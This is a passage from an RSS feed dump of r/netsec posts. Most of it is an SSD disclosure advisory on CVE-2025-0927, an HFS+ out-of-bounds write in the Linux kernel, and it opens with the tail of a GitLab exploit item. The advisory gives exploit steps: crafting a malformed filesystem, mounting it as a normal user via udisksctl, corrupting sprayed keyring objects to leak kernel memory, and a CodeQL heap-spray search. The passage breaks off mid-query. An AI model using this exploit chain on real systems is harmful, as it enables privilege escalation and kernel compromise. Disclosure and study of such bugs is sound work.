CVE-2024-0402</a>. We were able to do it despite the restricted time and connectivity. Still, there were tons of configuration errors while preparing the GitLab Workspaces environment, we almost surrendered because the feature itself was just not working after hours of setup. Once again, that demonstrates how very good bugs can be found in places where just a few people adventure because of config time constraints.</p><p>Shout out to <a href=\"https://gitlab.com/joernchen\" target=\"_blank\">joernchen</a> for the discovery of the chain.\nNot only was the bug great, but he also did an amazing work in describing the research path he followed in this <a href=\"https://gitlab-com.gitlab.io/gl-security/security-tech-notes/security-research-tech-notes/devfile/\" target=\"_blank\">article</a>. We had fun exploiting it and we hope people will save time with our public <a href=\"https://github.com/doyensec/malicious-devfile-registry\" target=\"_blank\">exploit</a>!</p>","contentLength":12462,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1je4j6r/arbitrary_file_write_cve20240402_in_gitlab_exploit/"},{"title":"Learn how an out-of-bounds write vulnerability in the Linux kernel can be exploited to achieve an LPE (CVE-2025-0927)","url":"https://ssd-disclosure.com/ssd-advisory-linux-kernel-hfsplus-slab-out-of-bounds-write/","date":1742301342,"author":"/u/SSDisclosure","guid":3214,"unread":true,"content":"<p>This advisory describes an out-of-bounds write vulnerability in the Linux kernel that achieves local privilege escalation on Ubuntu 22.04 for active user sessions.</p><p>An independent security researcher working with SSD Secure Disclosure.</p><ul><li>Linux Kernel, up to 6.12.0</li><li>Ubuntu 22.04 with Linux Kernel 6.5.0-18-generic</li></ul><p>This a vulnerability in the HFS+ driver of the Linux kernel. Interestingly, the vulnerability has always been present in the kernel tree since the initial git repository build  in 2005, that is, since Linux-2.6.12-rc2.</p><p>HFS+ had been the primary <a href=\"https://en.wikipedia.org/wiki/Mac_OS_X\">Mac OS X</a> file system until it was replaced with the <a href=\"https://en.wikipedia.org/wiki/Apple_File_System\">Apple File System</a> (APFS), released with <a href=\"https://en.wikipedia.org/wiki/MacOS_High_Sierra\">macOS High Sierra</a> in 2017. It is based on B-tree data structures and is <a href=\"https://developer.apple.com/library/archive/technotes/tn/tn1150.html\">well documented</a>. The vulnerability itself is a buffer overflow in B-tree node processing. Under certain circumstances, the function  found in  is used to populate an in-kernel buffer from the filesystem, and the function itself does not check for boundary conditions regarding the size of the key.</p><pre data-enlighter-language=\"cpp\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">void hfs_bnode_read_key(struct hfs_bnode *node, void *key, int off)\n{\n    struct hfs_btree *tree;\n    int key_len;\n\n    tree = node-&gt;tree;\n    if (node-&gt;type == HFS_NODE_LEAF ||\n        tree-&gt;attributes &amp; HFS_TREE_VARIDXKEYS ||\n        node-&gt;tree-&gt;cnid == HFSPLUS_ATTR_CNID)\n        key_len = hfs_bnode_read_u16(node, off) + 2;\n    else\n        key_len = tree-&gt;max_key_len + 2;\n\n    hfs_bnode_read(node, key, off, key_len);\n\n}</pre><p>Our understanding is that the authors must have assumed that this function was called only in contexts where it had been verified for B-tree records that the corresponding keys stored within those had reasonable length values. In particular,  enforces constraints on records that ensure that the key sizes are within the entry sizes, moreover when manipulating records within B-tree nodes, the code in  calls into  to determine the appropriate index, and this function is a logarithmic search that  impose sanity checks on each record it encounters via :</p><pre data-enlighter-language=\"cpp\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">/* Get the length of the key from a keyed record */\nu16 hfs_brec_keylen(struct hfs_bnode *node, u16 rec)\n{\n    u16 retval, recoff;\n\n    if (node-&gt;type != HFS_NODE_INDEX &amp;&amp; node-&gt;type != HFS_NODE_LEAF)\n        return 0;\n\n    if ((node-&gt;type == HFS_NODE_INDEX) &amp;&amp;\n       !(node-&gt;tree-&gt;attributes &amp; HFS_TREE_VARIDXKEYS) &amp;&amp;\n       (node-&gt;tree-&gt;cnid != HFSPLUS_ATTR_CNID)) {\n        retval = node-&gt;tree-&gt;max_key_len + 2;\n    } else {\n        recoff = hfs_bnode_read_u16(node,\n            node-&gt;tree-&gt;node_size - (rec + 1) * 2);\n        if (!recoff)\n            return 0;\n        if (recoff &gt; node-&gt;tree-&gt;node_size - 2) {\n            pr_err(\"recoff %d too large\\n\", recoff);\n            return 0;\n        }\n\n        retval = hfs_bnode_read_u16(node, recoff) + 2;\n        if (retval &gt; node-&gt;tree-&gt;max_key_len + 2) {\n            pr_err(\"keylen %d too large\\n\",\n                retval);\n            retval = 0;\n        }\n    }\n    return retval;\n}</pre><p>This code looks like it has some integer overflow issues, but the calling context correctly handles the cases. The B-tree header can define its own  value per the specification, but in practice in this driver,  enforces that each file’s maximum key size strictly equals to constant values known at compilation time:</p><pre data-enlighter-language=\"cpp\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">    case HFSPLUS_ATTR_CNID:\n        if (tree-&gt;max_key_len != HFSPLUS_ATTR_KEYLEN - sizeof(u16)) {\n            pr_err(\"invalid attributes max_key_len %d\\n\",\n                tree-&gt;max_key_len);\n            goto fail_page;\n        }</pre><pre data-enlighter-language=\"cpp\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">/* HFS+ attributes tree key */\nstruct hfsplus_attr_key {\n    __be16 key_len;\n    __be16 pad;\n    hfsplus_cnid cnid;\n    __be32 start_block;\n    struct hfsplus_attr_unistr key_name;\n} __packed;\n\n#define HFSPLUS_ATTR_KEYLEN    sizeof(struct hfsplus_attr_key)</pre><p>When manipulating nodes, the extracted keys are stored in generic kmalloc caches corresponding to this per-B-tree fixed size in :</p><pre data-enlighter-language=\"cpp\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">int hfs_find_init(struct hfs_btree *tree, struct hfs_find_data *fd)\n{\n    void *ptr;\n\n    fd-&gt;tree = tree;\n    fd-&gt;bnode = NULL;\n    ptr = kmalloc(tree-&gt;max_key_len * 2 + 4, GFP_KERNEL);\n    if (!ptr)\n        return -ENOMEM;\n    fd-&gt;search_key = ptr;\n    fd-&gt;key = ptr + tree-&gt;max_key_len + 2;\n    hfs_dbg(BNODE_REFS, \"find_init: %d (%p)\\n\",\n        tree-&gt;cnid, __builtin_return_address(0));\n    mutex_lock_nested(&amp;tree-&gt;tree_lock,\n            hfsplus_btree_lock_class(tree));\n    return 0;\n}</pre><p>For the attribute tree, this results in a  of  and an allocation of  bytes.</p><p>However, the invariant is not maintained for all calling contexts of , resulting in the vulnerability.</p><p>The specification allows B-trees to set much larger nodes than the default  size, up to , allowing for large records and keys accordingly.</p><p>Crucially, the function  does contain a logic flaw :</p><pre data-enlighter-language=\"cpp\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">/* Traverse a B*Tree from the root to a leaf finding best fit to key */\n/* Return allocated copy of node found, set recnum to best record */\nint hfs_brec_find(struct hfs_find_data * fd, search_strategy_t do_key_compare) {\n    struct hfs_btree * tree;\n    struct hfs_bnode * bnode;\n    u32 nidx, parent;\n    __be32 data;\n    int height, res;\n\n    tree = fd -&gt; tree;\n    if (fd -&gt; bnode)\n      hfs_bnode_put(fd -&gt; bnode);\n    fd -&gt; bnode = NULL;\n    nidx = tree -&gt; root;\n    if (!nidx)\n      return -ENOENT;\n    height = tree -&gt; depth;\n\n    [..]\n    for (;;) {\n      [..]\n      // Go through records - the writeup author's comment\n      __hfs_brec_find(bnode, fd, do_key_compare);\n\n    }</pre><p>In case the B-tree that we are working in does not specify a root node, e.g. is it null pointer, the code stops and return </p><p>In the calling context of  this is not a terminating condition, the code proceeds by trying to insert into the first place it can:</p><pre data-enlighter-language=\"cpp\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">err = hfs_brec_find(&amp;fd, hfs_find_rec_by_key);\nif (err != -ENOENT) {\n    if (!err)\n        err = -EEXIST;\n    goto failed_create_attr;\n}\n\nerr = hfs_brec_insert(&amp;fd, entry_ptr, entry_size);\nif (err)\n    goto failed_create_attr;</pre><p>Note, however, that in this case that the  function is not run for any of the records that we established above was meant to also carry out the boundary checks on key sizes.</p><p>The insertion code  on the other hand, does call directly into the vulnerable :</p><pre data-enlighter-language=\"cpp\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">/*\n * update parent key if we inserted a key\n * at the start of the node and it is not the new node\n */\n\nif (!rec &amp;&amp; new_node != node) {\n  hfs_bnode_read_key(node, fd -&gt; search_key, data_off + size);\n  hfs_brec_update_parent(fd);\n}</pre><p>For this operation to trigger, one only has to insert a new record with a key that is less than in B-tree key ordering than the first record of that particular node and the buffer overflow will be triggered. Meanwhile, the root node of the attribute B-tree is also attacker-controlled, allowing one to set it to null.</p><p>It is interesting to note that the driver along with many of the block device drivers was fuzzed before, relatively <a href=\"https://dl.acm.org/doi/pdf/10.1145/3391202\">extensively</a>, but this particular state has not been reproduced yet via fuzzers apparently, even though it is a fairly straightforward bug when manually analyzing the codebase.</p><p>First of all, it should be obvious to the attentive reader by now that in order to trigger these conditions and eventually the vulnerability, an attacker has to be able to mount a specially crafted filesystem.</p><p>This has been historically restricted to processes with the  capability. Since the introduction of namespaces, the kernel community has <a href=\"https://lwn.net/Articles/652468/\">investigated</a> restricting the trust the system has to place in underlying filesystems to make mounts more permissive. Finding a way was deemed to be an overly hard problem in general, however, there is an exception for filesystems that, via the  flag, identify themselves as being safe for use within user namespaces.</p><p>It has also been <a href=\"https://lwn.net/Articles/652472/\">said</a> during discussion of the proposal that:</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">&gt; Figuring out how to make semantics safe is what we are talking about.\n&gt; \n&gt; Once we sort out the semantics we can look at the handful of filesystems\n&gt; like fuse where the extra attack surface is not a concern.\n&gt; \n&gt; With that said desktop environments have for a long time been\n&gt; automatically mounting whichever filesystem you place in your computer,\n&gt; so in practice what this is really about is trying to align the kernel\n&gt; with how people use filesystems.\n\nThe key difference is that desktops only do this when you physically\nplug in a device. With unprivileged mounts, a hostile attacker\ndoesn't need physical access to the machine to exploit lurking\nkernel filesystem bugs. i.e. they can just use loopback mounts, and\nthey can keep mounting corrupted images until they find something\nthat works.</pre><p>So far these discussions were somewhat theoretical – to my knowledge, nobody has demonstrated a feasible attack scenario with malformed filesystems until this very writeup.</p><p>So, for the record, the Linux kernel in general only allows mounts for those with CAP_SYS_ADMIN, however, <strong>it is true that desktop and even server environments allow regular non-privileged users to mount and automount filesystems</strong>.</p><p>In particular, both the latest Ubuntu Desktop and Server versions come with default polkit rules that allow users with an  local session to create loop devices and mount a range of block filesystems commonly found on USB flash drives with . Inspecting <code>/usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy</code> shows:</p><pre data-enlighter-language=\"xml\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">&lt;action id=\"org.freedesktop.udisks2.filesystem-mount\"&gt;\n    &lt;description&gt;Mount a filesystem&lt;/description&gt;\n    [..]\n     &lt;defaults&gt;\n      &lt;allow_any&gt;auth_admin&lt;/allow_any&gt;\n      &lt;allow_inactive&gt;auth_admin&lt;/allow_inactive&gt;\n      &lt;allow_active&gt;yes&lt;/allow_active&gt;\n    &lt;/defaults&gt;\n &lt;/action&gt;</pre><pre data-enlighter-language=\"xml\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">&lt;action id=\"org.freedesktop.udisks2.loop-setup\"&gt;\n    &lt;description&gt;Manage loop devices&lt;/description&gt;\n    [..]\n    &lt;defaults&gt;\n      &lt;allow_any&gt;auth_admin&lt;/allow_any&gt;\n      &lt;allow_inactive&gt;auth_admin&lt;/allow_inactive&gt;\n      &lt;!-- NOTE: this is not a DoS because we are using /dev/loop-control --&gt;\n      &lt;allow_active&gt;yes&lt;/allow_active&gt;\n    &lt;/defaults&gt;\n  &lt;/action&gt;</pre><p>That is, not only can active <strong>normal (low-privileged) users</strong> mount filesystems, <strong>but they can set up loop devices as well</strong> based on local files something like this using :</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">DEVICE=$(udisksctl loop-setup -f malformed.raw | grep -o '/dev/loop[0-9]*')`\nudisksctl mount -b \"$DEVICE\"</pre><p>For a user with  set to “yes” the followings are true:</p><ol><li>: The user must be logged in and actively interacting with the system (e.g., local desktop session or terminal).</li><li>: The user can perform the action without needing to authenticate (no password or privilege escalation required).</li></ol><p>Although this is a design decision to the best of my understanding to make user experience more comfortable, for the purposes of discussing the exploitation detail, I’ll refer to this capability as a , emphasizing that this is the result of distro userspace configurations that practically bypasses the CAP_SYS_ADMIN restrictions that the kernel itself would impose on normal users.</p><p>**the oracle terminology is used throughout in theoretical computer science to investigate complexity classes where you mathematically allow them to magically access computational capabilities that they don’t generally have. I feel like there is a strong enough analogy here to abuse this word. *</p><p>Now that we established that for practical purposes we can mount specially crafted files of our choice and HFS+ filesystems are supported by Ubuntu and many other systems, the only exercise left is to craft an actual exploit for it.</p><p>The OOB write gives us plenty of control and a strong primitive to start with. As discussed above, the buffer overflow enables us to overwrite a buffer allocated in the  generic slab cache by data of our choice with a size that is also of our choosing up to 16 bits. Well, the exact size is limited by the node size, but this still means that we can overwrite a buffer of 1024 bytes with up to almost  bytes.</p><p>In the past, many slab UAF and OOB exploits abused the  structure for both kernel infoleaks and execution control, as it is a nice elastic structure that is easy to control from userspace, behaves well under exploitation scenarios, and it can span multiple kmalloc cache sizes. Since the introduction of <a href=\"https://github.com/torvalds/linux/commit/494c1dfe855ec1f70f89552fce5eadf4a1717552\">kmalloc-cg-*</a> caches, vulnerable object allocations will only land in the same slab cache if allocation flags match.</p><p>In case of msg_msg and other useful objects for heap sprays, the kernel started allocating them with <a href=\"https://elixir.bootlin.com/linux/v6.5/C/ident/GFP_KERNEL_ACCOUNT\">GFP_KERNEL_ACCOUNT</a>, so our simple  allocation would land in an isolated slab cache, different from all those with the account flag. Moreover, since 6.6, the  configuration option hardens things even further by actually using this as a security measure as it <a href=\"https://sam4k.com/exploring-linux-random-kmalloc-caches/#introducing-random-kmalloc-caches\">introduces</a> *multiple* generic slab caches for each size (named ,  etc.).</p><p>When an object allocated via  it is allocated to one of these 16 caches “randomly” and the exact one depends call site for the  and a per-boot seed. Even more recently in 6.11, inspired by the success of  based exploits, a patch by Kees Cook <a href=\"https://github.com/torvalds/linux/commit/734bbc1c97ea7e46e0e53b087de16c87c03bd65f\">attempted to kill</a> these attacks by introducing a separate set of kmalloc buckets via the kmem_buckets API, specifically for .</p><p>For most practical purposes, exploiting this vulnerability would be fairly easy for Ubuntu 22.04 sporting the 5.15 LTS kernel using techniques that others have extensively written about earlier. At the time of the research, 22.04 HWE is on 6.5, so I selected that as the target.</p><p>We won’t go super deep into the internals of the SLUB allocator, as there is a lot of material available online. Andrey Konovalov’s recent <a href=\"https://www.youtube.com/watch?v=2hYzxsWeNcE&amp;ab_channel=TheLinuxFoundation\">talk at the Linux Security Summit</a> is an excellent introduction to the topic. Still, we will try to make things relatively self-contained.</p><p>Basically, our goal is to get hold of a bunch of dynamically allocated objects in kernel space that we have some control over, use our write primitive to corrupt fields of them, use this capability to leak some kernel addressess to defeat <a href=\"https://lwn.net/Articles/569635/\">KASLR</a> and then use some more memory corruption to somehow achieve local privilege escalation.</p><p>As distros like Ubuntu enable a bunch of hardening configuration options, we will assume these to be turned on in particular: , , . SMEP, SMAP and KPTI can be also assumed to be present and turned on.</p><p>So at this point, our draft strategy looks something like this:</p><ul><li>Craft a malformed filesystem that is able to trigger the primitive</li><li>Use our ‘‘ to mount the filesystem as a normal user</li><li>Spray some useful objects into kmalloc-1k</li><li>Trigger the out-of-bounds write primitive to corrupt those objects and leak KASLR base</li><li>Correct for the address of  using the KASLR leak</li><li>Turn the primitive into some arbitrary write capability</li></ul><p>Let’s start with the first step.</p><p>Crafting a well-formed hfsplus filesystem is relatively easy using . According to the specs, we are expecting a volume structured like this.</p><p>All the structures are well documented in the technical note, and <a href=\"https://github.com/torvalds/linux/blob/master/fs/hfsplus/hfsplus_raw.h\">fs/hfsplus/hfsplus_raw.h</a> contains all of the relevant definitions that hfsplus uses on the block level. Although there were some tricks we investigated with abusing the volume to map file extents back to hfs+ control “metadata” to make the exploit prettier, we realized that at that point, it would be too convoluted to have any pedagogical/writeup value, we won’t be dealing with any of the stuff that actually handles how data within files get stored on the file system. For the sake of this discussion, there are only a handful of important facts of HFS+ systems:</p><ul><li>The catalog file stores the directory and file structure on the volume. That is, when you run , the stuff that is listed will be based on that.</li><li>The attributes file stores and maps all the extended attributes to files and directories. Whenever you call <a href=\"https://man7.org/linux/man-pages/man2/setxattr.2.html\">setxattr</a>, you expect things to happen there.</li><li>Both of these are just good old B-tree data structures.</li><li>Not so surprisingly, extended attribute B-tree records are keyed according to their extended attribute names.</li></ul><p>So, going for a  to create a 128M hfsplus volume will result in a volume header like this:</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">00000400: 482b 0004 8000 0100 3130 2e30 0000 0000  H+......10.0....\n00000410: e330 03d6 e330 03d6 0000 0000 e330 03d6  .0...0.......0..\n00000420: 0000 0000 0000 0000 0000 1000 0000 8000  ................\n00000430: 0000 7cfd 0000 1702 0001 0000 0001 0000  ..|.............\n00000440: 0000 0010 0000 0000 0000 0000 0000 0001  ................\n00000450: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n00000460: 0000 0000 0000 0000 d809 6a4c 2408 d81f  ..........jL$...\n00000470: 0000 0000 0000 1000 0000 1000 0000 0001  ................\n00000480: 0000 0001 0000 0001 0000 0000 0000 0000  ................\n00000490: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n000004a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n000004b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n000004c0: 0000 0000 0010 0000 0010 0000 0000 0100  ................\n000004d0: 0000 0002 0000 0100 0000 0000 0000 0000  ................\n000004e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n000004f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n00000500: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n00000510: 0000 0000 0010 0000 0010 0000 0000 0100  ................\n00000520: 0000 *0c02* 0000 0100 0000 0000 0000 0000  ................\n00000530: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n00000540: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n00000550: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n00000560: 0000 0000 0010 0000 0010 0000 0000 0100  ................\n00000570: 0000 *0102* 0000 0100 0000 0000 0000 0000  ................\n00000580: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n00000590: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n000005a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n000005b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n000005c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n000005d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................</pre><p>After cross referencing it with the  struct in header files and consulting , it should be obvious that:</p><ul><li>The catalog file is located at </li><li>The attribute file is located at </li></ul><p>Both of these are B-trees, so seeking to these addresses, we are presented with header nodes and B-tree headers inside them.</p><p>All nodes in the tree are either header nodes, index nodes, map nodes or leaf nodes and they have this structure no matter what:</p><p>Now, we won’t be concerned about the catalog file too much either. Given our vulnerability, there are only a few requirements to trigger our primitive:</p><ul><li>The attribute B-tree’s root must be a null pointer (to bypass checks in )</li><li>There has to be a valid file on the filesystem with world-write permissions that we can set attributes on (this comes from the catalog)</li><li>Whatever extended attribute we are setting, it has to trigger , meaning that the file should have a bunch of extended attributes already, and the one we are inserting has to have a lower key than those so the code considers it for inserting it as the first record in the node</li></ul><p>Oh, and for meaningful results, our key length should be more than 1024 to do something useful in kmalloc-1k overflows, but that’s trivial.</p><p>To achieve this, one can mount the fresh hfs+ filesystem just created with mkfs. In the exploit, we just touch a file  and add a few user extended attributes on it. Namely, we can add , ,  and  with some dummy value as extended attributes.</p><p>Umounting and checking how it looks like in binary, we just have to seek to the attribute file offset that we found above at .</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">00102000: 0000 0000 0000 0000 0100 0003 0000 0000  ................\n00102010: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n00102020: 2000 010a 0000 0080 0000 007f 0000 0010   ...............</pre><p>The  at  means that nodes are of that size, an since this is a header node, we have to seek  forward to find the first node holding actually funky data.</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">00104000: 0000 0000 0000 0000 ff01 0004 0000 001e  ................\n00104010: 0000 0000 0010 0000 0000 0009 0075 0073  .............u.s\n00104020: 0065 0072 002e 0066 006f 0075 0072 0000  .e.r...f.o.u.r..\n00104030: 0010 0000 0000 0000 0000 0000 0005 6475  ..............du\n00104040: 6d6d 7900 001c 0000 0000 0010 0000 0000  mmy.............\n00104050: 0008 0075 0073 0065 0072 002e 006f 006e  ...u.s.e.r...o.n\n00104060: 0065 0000 0010 0000 0000 0000 0000 0000  .e..............\n00104070: 0005 6475 6d6d 7900 0020 0000 0000 0010  ..dummy.. ......\n00104080: 0000 0000 000a 0075 0073 0065 0072 002e  .......u.s.e.r..\n00104090: 0074 0068 0072 0065 0065 0000 0010 0000  .t.h.r.e.e......\n001040a0: 0000 0000 0000 0000 0005 6475 6d6d 7900  ..........dummy.\n001040b0: 001c 0000 0000 0010 0000 0000 0008 0075  ...............u\n001040c0: 0073 0065 0072 002e 0074 0077 006f 0000  .s.e.r...t.w.o..\n001040d0: 0010 0000 0000 0000 0000 0000 0005 6475  ..............du\n001040e0: 6d6d 7900 0000 0000 0000 0000 0000 0000  mmy.............\n001040f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n00104100: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n00104110: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n00104120: 0000 0000 0000 0000 0000 0000 0000 0000  ................</pre><p>We don’t know about you, but for me, that  at  looks like a byte that’s screaming for being overwritten by attacker-controlled data. Once we overwrite it, the vulnerable function will just pile up whatever junk is in the filesystem and  it over that kmalloc-1k slab we have in memory.</p><p>How do we overwrite it? Write-these-bytes-to-this-file. After that we just mount the file with our oracle, and then perform a  with an attribute with the lowest lexicographic ordering in the node, and that will result in memory corruption in kernel space.</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">char *attr_value = \"dummy\";\nint result = setxattr(\"/tmp/mnt0/hacked_node\", \"user.1\", attr_value, strlen(attr_value), 0);\n\nif (result != 0)\n    do_error_exit(\"setxattr attempt on vuln fs\");</pre><p>We are finished with the first part.</p><p>Now that we can corrupt and mount a filesystem and trigger our uncontrolled write primitive, it is time to chose some target objects. Luckily, it is a <a href=\"https://etenal.me/archives/1825\">well known</a> trick to spray a bunch of ‘s into your target cache and overwrite those. Now, on 6.5, these are still in generic kmalloc caches:</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">    upayload = kmalloc(sizeof(*upayload) + datalen, GFP_KERNEL);</pre><p>The tool of the trade is then to kick off a bunch of keys using keyctl() with data that makes them sit in kmalloc-1k, then trigger our primitive and overwrite datalen:</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">struct user_key_payload {\n  struct rcu_head rcu; /* RCU destructor */\n  unsigned short datalen; /* length of this data */\n  char data[] __aligned(__alignof__(u64)); /* actual data */\n};</pre><p>Kindergarten stuff really. All it takes is to overwrite our  slab slot by s and  and hope for the best. In the exploit code this corresponds to:</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">void hack_hfs_keyring(unsigned char * hfs_buffer, size_t len, uint64_t dummy) {\n    /* Let's check some basic information about our volume */\n    parse_volume(hfs_buffer, len);\n\n    /* First, we hack the attribute B-tree a little bit */\n    resize_nodes(hfs_buffer, len);\n\n    /* Remove root */\n    remove_root(hfs_buffer, len);\n\n    /* Corrupt key length */\n    corrupt_key_len(hfs_buffer, len, 0x418 - 2);\n\n    uint8_t payload[24] = {\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n    0xff, 0xff, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53\n    };\n\n    uint16_t payload_len = sizeof(payload);\n\n    /* Write kmalloc-1k payload */\n    write_payload(hfs_buffer, len, payload, payload_len);\n}</pre><p>The sole purpose of this code is to corrupt a single key, and overwrite its datalen with , which would be a pretty comfortable out-of-bounds read.</p><p>If our kernel mode mambojambo was successful, we can actually check for that condition in userspace:</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">uint64_t get_keyring_leak(key_serial_t * id_buffer, uint32_t id_buffer_size)`\n{\n    uint8_t buffer[USHRT_MAX] = {0};\n    int32_t keylen;\n\n    printf(\"[+] Checking sprayed keys for corruption\\n\");\n    for (uint32_t i = 0; i &lt; id_buffer_size; i++) {\n\n        keylen = keyctl(KEYCTL_READ, id_buffer[i], (long)buffer, USHRT_MAX, 0);\n\n        if (keylen &lt; 0)\n            continue;\n\n        if (keylen &gt; 1024) {\n            printf(\"[+] Found corrupted key, triggering infoleak\\n\");\n            return parse_leak(buffer, keylen);\n        }\n    }\n    return 0;\n}</pre><p>Reading on the key via the appropriate system call at this point actually results in a very nice dump of 65k of kernel memory.</p><p>That’s all fascinating, but in order to defeat KASLR, a random kernel memory dump won’t suffice. We need some function pointers at addresses we can calculate. Well, easier said than done.</p><p>Apart from a few academic papers that actually tried to systematically <a href=\"https://dl.acm.org/doi/10.1145/3372297.3423353\">investigate all the slab allocated elastic objects</a> with nice interfaces, there isn’t too much information out there on the definitive guide to heap spraying. It is hard to do justice to the subject in general and for practical exploitation, one is always working with a specific kernel build directly. The tool of the trade is either using <a href=\"https://linux.die.net/man/1/pahole\">pahole</a> to hunt for nice structures in the Linux kernel, but that tool is completely static and it has absolutely no understanding of userspace taintability, so another approach is to create a Linux kernel database for CodeQL queries and refine your search for the target with some smart filtering:</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">/**\n * @name Find interesting objects for kernel heap exploitation\n * @id cpp/kernel-interesting-objects\n * @description Finds interesting objects for kernel heap exploitation\n * @kind problem\n * @precision low\n * @tags security kernel\n * @problem.severity error\n */\n\nimport cpp\n\nclass FlexibleArrayMember extends Field {\n  FlexibleArrayMember() {\n    exists(Struct s |\n      this = s.getCanonicalMember(max(int j | s.getCanonicalMember(j) instanceof Field | j))\n    ) and\n    this.getUnspecifiedType() instanceof ArrayType and\n    (\n      this.getUnspecifiedType().(ArrayType).getArraySize() &lt;= 1 or\n      not this.getUnspecifiedType().(ArrayType).hasArraySize()\n    )\n  }\n}\n\nclass KmallocCall extends FunctionCall {\n  KmallocCall() { this.getTarget().hasName([\"kmalloc\", \"kzalloc\", \"kvmalloc\"]) }\n\n  Expr getSizeArg() { result = this.getArgument(0) }\n\n  string getFlag() {\n    result =\n      concat(Expr flag |\n        flag = this.getArgument(1).getAChild*() and flag.getValueText().matches(\"%GFP%\")\n      |\n        flag.getValueText(), \"|\"\n      )\n  }\n\n  string getSize() {\n    if this.getSizeArg().isConstant()\n    then result = this.getSizeArg().getValue()\n    else result = \"unknown\"\n  }\n\n  Type sizeofParam(Expr e) {\n    result = 